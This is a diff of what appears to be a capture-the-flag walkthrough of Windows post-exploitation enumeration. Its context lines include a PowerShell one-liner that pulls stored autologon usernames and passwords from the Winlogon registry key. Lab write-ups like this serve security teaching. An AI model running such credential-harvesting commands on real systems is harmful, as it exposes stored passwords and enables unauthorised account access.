@@ -163,7 +163,7 @@ Done:
 ```
 2. searching in IIS webroot: `ls -force c:\inetpub\wwwroot` we get **access denied**
 3. searching within hazard's profile, we get **access denied**
-4. searching for autologon creds, with a *little powershell one-liner I wrote:*
+4. searching for **Autologon Creds**, with a *little powershell one-liner I wrote:*
 ```
 $ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}};$ErrorActionPreference='Continue'
 ```
